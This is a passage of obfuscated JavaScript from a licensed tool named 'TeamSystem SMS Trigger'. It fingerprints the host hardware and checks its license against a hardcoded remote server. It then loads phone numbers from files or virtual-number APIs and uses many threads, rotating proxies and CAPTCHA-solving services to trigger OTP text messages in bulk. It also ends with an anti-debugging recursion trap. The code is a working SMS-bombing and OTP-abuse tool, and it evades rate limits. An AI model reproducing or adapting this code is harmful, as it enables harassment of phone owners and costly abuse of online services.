                  const v637 = {};
                  v637.name = 'No', v637.value = 'no';
                  const v638 = await selectOption("Save key?", [v636, v637]);
                  if (v638 === "yes" && v629) fs.writeFileSync(MAIL_CX_KEY_FILE, v629, "utf8");
                }
              }
              v511 = v629, v499 = 0x5;
            } else {
              if (v499 === 0x5) {
                const v639 = {};
                v639.name = "⬅️ Back", v639.value = "back";
                const v640 = await selectOption("SELECT PROXIES FILE", [{
                  'name': "✏️ Custom File Path",
                  'value': "custom"
                }, {
                  'name': "🚫 None (Direct Connection)",
                  'value': "none"
                }, v639]);
                if (v640 === "back") {
                  v499 = 0x4;
                  continue;
                }
                if (v640 === "custom") {
                  const v641 = await promptText("Enter Proxies File Path:", "proxies.txt");
                  if (v641.toLowerCase() === "back") continue;
                  v507 = v641;
                } else v640 === "none" ? v507 = '' : v507 = v640;
                v499 = 0x6;
              } else {
                if (v499 === 0x6) {
                  const v642 = {};
                  v642.name = "50 Threads (Fast)", v642.value = 0x32;
                  const v643 = {};
                  v643.name = "⌨️ Custom...", v643.value = "custom";
                  const v644 = await selectOption("SELECT THREADS", [{
                    'name': "5 Threads (Slow)",
                    'value': 0x5
                  }, {
                    'name': "10 Threads",
                    'value': 0xa
                  }, {
                    'name': "20 Threads (Default)",
                    'value': 0x14
                  }, v642, v643, {
                    'name': "⬅️ Back",
                    'value': "back"
                  }]);
                  if (v644 === "back") {
                    v499 = 0x5;
                    continue;
                  }
                  if (v644 === "custom") {
                    const v645 = await promptText("Enter custom number of threads:", '20');
                    if (v645.toLowerCase() === "back") continue;
                    v502 = parseInt(v645) || 0x14;
                  } else v502 = v644;
                  v499 = 0x7;
                } else {
                  if (v499 === 0x7) break;
                }
              }
            }
          }
        }
      }
    }
    process.stdin.pause();
    return {
      'numbersFile': v501,
      'threads': String(v502),
      'proxiesFile': v507,
      'antiCaptchaKey': v508,
      'twoCaptchaKey': v509,
      'captchaProvider': v510,
      'mailCxKey': v511,
      'nexaConfig': v503,
      'twoOoConfig': v504,
      'smsBowerConfig': v505,
      'zenexConfig': v506
    };
  }
  function generateHWID() {
    const v646 = require('os'),
      v647 = v646.platform();
    try {
      if (v647 === "win32") {
        const v648 = {};
        v648.stdio = "pipe", v648.timeout = 0x3a98;
        const v649 = execSync("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command \"$mg = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter 'DeviceID=\\'C:\\'' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join '|')\"", v648).toString().trim();
        if (!v649) throw new Error("No hardware data");
        const v650 = crypto.createHash("sha256").update(v649).digest("hex").toUpperCase();
        return "SKING-" + v650.substring(0x0, 0x8) + '-' + v650.substring(0x8, 0xc) + '-' + v650.substring(0xc, 0x10);
      } else {
        let v651 = [];
        try {
          const v655 = {};
          v655.stdio = "pipe", v655.timeout = 0x1388;
          const v656 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", v655).toString().trim();
          if (v656 && v656 !== "null") v651.push('A:' + v656);
        } catch (v657) {}
        try {
          if (fs.existsSync("/proc/cpuinfo")) {
            const v658 = fs.readFileSync("/proc/cpuinfo", "utf8"),
              v659 = v658.match(/Serial\s*:\s*(\S+)/i),
              v660 = v658.match(/Hardware\s*:\s*(.+)/i);
            if (v659 && v659[0x1] !== "0000000000000000") v651.push('S:' + v659[0x1].trim());
            if (v660) v651.push('H:' + v660[0x1].trim());
          }
        } catch (v661) {}
        try {
          if (fs.existsSync("/etc/machine-id")) {
            const v662 = fs.readFileSync("/etc/machine-id", "utf8").trim();
            if (v662) v651.push('M:' + v662);
          }
        } catch (v663) {}
        try {
          const v664 = v646.cpus(),
            v665 = v664 && v664.length > 0x0 ? v664[0x0].model : "UnknownCPU",
            v666 = v646.totalmem(),
            v667 = v646.release(),
            v668 = v646.hostname();
          v651.push('F:' + v665 + '|' + v666 + '|' + v667 + '|' + v668);
        } catch (v669) {}
        const v652 = v651.join('||'),
          v653 = crypto.createHash("sha256").update(v652).digest("hex").toUpperCase(),
          v654 = require('os').platform() === "android" ? "ANKING-" : "SKING-";
        return v654 + v653.substring(0x0, 0x8) + '-' + v653.substring(0x8, 0xc) + '-' + v653.substring(0xc, 0x10);
      }
    } catch (v670) {
      return '';
    }
  }
  function verifyServerSignature(v671, v672) {
    if (!v672) return false;
    try {
      return crypto.verify(null, Buffer.from(v671, "utf8"), "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----", Buffer.from(v672, "base64"));
    } catch (v673) {
      return false;
    }
  }
  async function start() {
    const v674 = generateHWID();
    !v674 && (console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(0x1));
    const v675 = generateHWID();
    v675 !== v674 && (console.error(R("\n  ✗ HWID integrity check failed.\n")), process.exit(0x1));
    printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + B("TeamSystem SMS Trigger       ") + W('│')), console.log(W("│ [•] Your HWID : ") + C(v674.padEnd(0x1d)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘\n"));
    let v676 = false,
      v677 = '';
    const v678 = Date.now();
    try {
      const v707 = await new Promise((v708, v709) => {
        const v710 = {};
        v710.hwid = v674, v710.app_id = "teamsystem", v710.version = "1.0.0", v710.timestamp = v678;
        const v711 = JSON.stringify(v710),
          v712 = {
            'hostname': "188.137.176.163",
            'port': 0xec1,
            'path': "/api/verify",
            'method': "POST",
            'headers': {
              'Content-Type': "application/json",
              'Content-Length': Buffer.byteLength(v711)
            },
            'timeout': 0x2710
          },
          v713 = http.request(v712, v714 => {
            let v715 = '';
            v714.on("data", v716 => v715 += v716), v714.on("end", () => {
              try {
                v708(JSON.parse(v715));
              } catch (v717) {
                v709(v717);
              }
            });
          });
        v713.on("error", v709), v713.on("timeout", function () {
          this.destroy();
          v709(new Error("Timeout"));
        }), v713.write(v711);
        v713.end();
      });
      if (v707) {
        v707.status === "update_required" && (console.error(R("\n  ✗ Update required!\n")), process.exit(0x1));
        if (v707.status === "banned" || v707.status === "expired" || !v707.sig) {
          await new Promise(v720 => setTimeout(v720, 0x7d0));
          let v719 = String(v707.reason || "NOT REGISTERED");
          if (!v707.reason && !v707.sig) v719 = "NOT REGISTERED / REMOVED";
          console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║   ✗ UNAUTHORIZED HARDWARE — TSID TOOL       ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v674.padEnd(0x21)) + R('║')), console.error(R("  ║  Status : " + v719.padEnd(0x1a) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(0x1);
        }
        const v718 = v674 + "|teamsystem|1.0.0|" + v678;
        !verifyServerSignature(v718, v707.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Try again later.\n")), process.exit(0x1)), v676 = true, v677 = v707.token, !v677 && (console.error(R("\n  ✗ Invalid Server Response: Missing Session Token.\n")), process.exit(0x1)), setInterval(() => {
          !v677 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(0x1));
          const v721 = {};
          v721.hwid = v674, v721.app_id = "teamsystem", v721.token = v677;
          const v722 = JSON.stringify(v721),
            v723 = {
              'hostname': "188.137.176.163",
              'port': 0xec1,
              'path': "/api/ping",
              'method': "POST",
              'headers': {
                'Content-Type': "application/json",
                'Content-Length': Buffer.byteLength(v722)
              },
              'timeout': 0x1388
            },
            v724 = http.request(v723, v725 => {
              let v726 = '';
              v725.on("data", v727 => v726 += v727);
              v725.on("end", () => {
                try {
                  const v728 = JSON.parse(v726);
                  if (v728.status === 'ok' && v728.token) v677 = v728.token;else console.error(R("\n  ✗ Session invalidated. Exiting...\n")), process.exit(0x1);
                } catch (v729) {
                  console.error(R("\n  ✗ Ping parse error. Exiting...\n")), process.exit(0x1);
                }
              });
            });
          v724.on("error", () => {
            console.error(R("\n  ✗ Disconnected from License Server.\n"));
            process.exit(0x1);
          }), v724.on("timeout", function () {
            this.destroy();
            console.error(R("\n  ✗ License ping timeout.\n"));
            process.exit(0x1);
          }), v724.write(v722), v724.end();
        }, 0xafc8);
      }
    } catch (v730) {
      console.error(R("\n  ✗ License server unreachable. Check internet connection.\n")), process.exit(0x1);
    }
    !v676 && (console.error(R("\n  ✗ License verification failed.\n")), process.exit(0x1));
    let v679 = process.argv.slice(0x2),
      v680 = null,
      v681 = null,
      v682 = null,
      v683 = null,
      v684 = '',
      v685 = '',
      v686 = "anticaptcha",
      v687 = '';
    if (v679.length === 0x0) {
      const v731 = await interactiveWizard();
      v679 = [v731.numbersFile, v731.threads, v731.proxiesFile], v680 = v731.nexaConfig || null, v681 = v731.twoOoConfig || null, v682 = v731.smsBowerConfig || null, v683 = v731.zenexConfig || null, v684 = v731.antiCaptchaKey || '', v685 = v731.twoCaptchaKey || '', v686 = v731.captchaProvider || "anticaptcha", v687 = v731.mailCxKey || '';
    }
    const v688 = path.resolve(v679[0x0] || "numbers.txt"),
      v689 = parseInt(v679[0x1]) || 0x14;
    let v690 = v679[0x2] !== undefined ? v679[0x2] : "proxies.txt";
    if (v690.toLowerCase() === "none") v690 = '';
    const v691 = generateHWID();
    v691 !== v674 && (console.error(R("\n  ✗ HWID mismatch during execution. Aborting...\n")), process.exit(0x1));
    printHeader(), console.log(B("  ✓ License: Licensed") + G(" | HWID: " + v674));
    const v692 = v680 || v681 || v682 || v683;
    let v693 = [];
    !v692 && (!fs.existsSync(v688) && (console.error(R("✗ Numbers file not found: " + v688)), process.exit(0x1)), v693 = fs.readFileSync(v688, "utf8").split(/\r?\n/).map(v732 => v732.trim()).filter(v733 => v733.length > 0x5));
    let v694 = [];
    v690 && fs.existsSync(v690) && (v694 = fs.readFileSync(v690, "utf8").split('\x0a').map(v734 => v734.trim()).filter(v735 => v735.length > 0x0));
    const v695 = v694.map(parseProxy).filter(Boolean);
    if (v692) {
      const v736 = v680 ? "NexaOTP" : v681 ? v681.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥" : v682 ? "📱 SMS Bower" : "⚡ Zenex";
      console.log(C("✓ Target  : " + v736 + " API (" + v692.totalCount + " numbers)"));
    } else console.log(C("✓ Loaded  : " + v693.length + " targets"));
    console.log(v695.length === 0x0 ? G("  No proxies (direct)") : G("  Proxies: " + v695.length)), console.log(C("✓ Threads : " + v689));
    const v696 = v686 === "2captcha" ? "2Captcha" : v686 === "both" ? "Anti-Captcha + 2Captcha ⚡" : "Anti-Captcha";
    console.log(C("✓ CAPTCHA : " + v696 + '\x0a')), fs.writeFileSync("successful.txt", ''), fs.writeFileSync("failed.txt", ''), fs.writeFileSync("debug.txt", "=== DEBUG SESSION " + new Date().toISOString() + " ===\n");
    const v697 = new Dashboard(v692 ? v692.totalCount : v693.length);
    let v698 = [],
      v699 = [],
      v700 = 0x0,
      v701 = false;
    if (v680 || v681) {
      const v737 = v680 ? "NexaOTP" : v681.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥";
      console.log(Y("\n  [" + v737 + "] Streaming " + v692.totalCount + " numbers (" + v692.ranges.length + " range(s))...")), (async () => {
        let v738 = 0x0,
          v739 = '';
        try {
          for (let v740 = 0x0; v740 < v692.totalCount; v740++) {
            try {
              const v741 = v692.ranges[Math.floor(Math.random() * v692.ranges.length)];
              let v742;
              if (v680) v742 = await nexaLimiter.enqueue(() => nexaFetchNumber(v680.apiKey, v741, v680.serverEndpoint));else v742 = await twoOoLimiter.enqueue(() => twoOoFetchNumber(v681.apiKey, v741, v681.getPath));
              if (v742) {
                v700++, v738 = 0x0;
                if (v699.length > 0x0) v699.shift()(v742);else v698.push(v742);
              }
            } catch (v743) {
              v739 = v743.message;
              if (v743.message.includes("Insufficient balance")) {
                console.error(R("\n  [" + v737 + "] ✗ Insufficient balance.\n"));
                break;
              }
              v738++;
              if (v738 >= 0x5 && v700 === 0x0) {
                console.error(R("\n  [" + v737 + "] ✗ 5 consecutive failures: " + v739 + '\x0a'));
                break;
              }
            }
          }
        } finally {
          v701 = true;
          while (v699.length > 0x0) v699.shift()(null);
        }
      })();
    } else {
      if (v682) {
        const v744 = v682;
        console.log(Y("\n  [📱 SMS Bower] Streaming " + v744.totalCount + " numbers...")), (async () => {
          let v745 = 0x0;
          try {
            for (let v746 = 0x0; v746 < v744.totalCount; v746++) {
              try {
                const {
                  phoneNumber: v747
                } = await smsBowerFetchNumber(v744.apiKey, v744.service, v744.country, v744.maxPrice);
                v700++, v745 = 0x0;
                if (v699.length > 0x0) v699.shift()(v747);else v698.push(v747);
              } catch (v748) {
                v745++;
                if (v745 >= 0x5 && v700 === 0x0) break;
                await new Promise(v749 => setTimeout(v749, 0x7d0));
              }
            }
          } finally {
            v701 = true;
            while (v699.length > 0x0) v699.shift()(null);
          }
        })();
      } else {
        if (v683) {
          const v750 = v683;
          console.log(Y("\n  [⚡ Zenex] Streaming " + v750.totalCount + " numbers (" + v750.ranges.length + " range(s))...")), (async () => {
            let v751 = 0x0;
            try {
              for (let v752 = 0x0; v752 < v750.totalCount; v752++) {
                try {
                  const v753 = v750.ranges[Math.floor(Math.random() * v750.ranges.length)],
                    v754 = await zenexFetchNumber(v750.apiKey, v753);
                  v700++, v751 = 0x0;
                  if (v699.length > 0x0) v699.shift()(v754);else v698.push(v754);
                } catch (v755) {
                  v751++;
                  if (v751 >= 0x5 && v700 === 0x0) break;
                  await new Promise(v756 => setTimeout(v756, 0x7d0));
                }
              }
            } finally {
              v701 = true;
              while (v699.length > 0x0) v699.shift()(null);
            }
          })();
        }
      }
    }
    const v702 = !!(v680 || v681 || v682 || v683),
      v703 = v702 ? () => {
        if (v698.length > 0x0) return Promise.resolve(v698.shift());
        if (v701) return Promise.resolve(null);
        return new Promise(v757 => v699.push(v757));
      } : () => {
        if (v693.length === 0x0) return Promise.resolve(null);
        const v758 = Math.floor(Math.random() * v693.length);
        return Promise.resolve(v693.splice(v758, 0x1)[0x0]);
      },
      fn11 = () => {
        if (v695.length === 0x0) return null;
        const v759 = v695[Math.floor(Math.random() * v695.length)];
        return rotateSessionId(v759);
      };
    function fn12(v760) {
      try {
        if (v702) return;
        const v761 = String(v760).replace(/\D/g, ''),
          v762 = fs.readFileSync(v688, "utf8"),
          v763 = v762.split(/\r?\n/).filter(v764 => {
            const v765 = v764.trim();
            if (!v765) return false;
            if (v765 === v760.trim()) return false;
            const v766 = v765.replace(/\D/g, '');
            return v766 !== v761;
          }).join('\x0a');
        fs.writeFileSync(v688, v763);
      } catch (v767) {}
    }
    const v704 = v702 ? Math.min(v689, v692.totalCount) : Math.min(v689, v693.length),
      v705 = [],
      v706 = setInterval(() => v697.render(), 0x1f4);
    async function fn13(v768) {
      while (true) {
        const v769 = [];
        for (let v770 = 0x0; v770 < 0xa; v770++) {
          const v771 = await v703();
          if (!v771) break;
          v769.push(v771);
        }
        if (v769.length === 0x0) break;
        try {
          const v772 = await triggerOTPBatch(v769, {
            'onStatus': v773 => v697.setStatus("Worker " + v768 + ':\x20' + v773),
            'proxy': fn11(),
            'antiCaptchaKey': v684,
            'twoCaptchaKey': v685,
            'captchaProvider': v686,
            'mailCxKey': v687
          });
          for (const v774 of v772) {
            v697.processed++, v774.success ? (v697.successful++, fn12(v774.phone), fs.appendFileSync("successful.txt", v774.phone + "|SMS_SENT\n"), v697.addLog("Triggered OTP for " + v774.phone, "success")) : (v697.failed++, fn12(v774.phone), fs.appendFileSync("failed.txt", v774.phone + '|' + v774.message + '\x0a'), v697.addLog("Failed on " + v774.phone + ':\x20' + v774.message, "error"));
          }
        } catch (v775) {
          for (const v776 of v769) {
            v697.failed++, v697.processed++, fn12(v776), v697.addLog("Fatal error on " + v776 + ':\x20' + v775.message, "error");
          }
        }
      }
    }
    for (let v777 = 0x0; v777 < v704; v777++) v705.push(fn13(v777));
    await Promise.all(v705), clearInterval(v706), v697.render();
    v697.stop();
  }
  start().catch(v778 => {
    console.error(R("Fatal error: " + v778.message));
    process.exit(0x1);
  });
}
function fn2(v779) {
  function fn14(v780) {
    fn14(++v780);
  }
  try {
    if (v779) return fn14;else fn14(0x0);
  } catch (v781) {}
}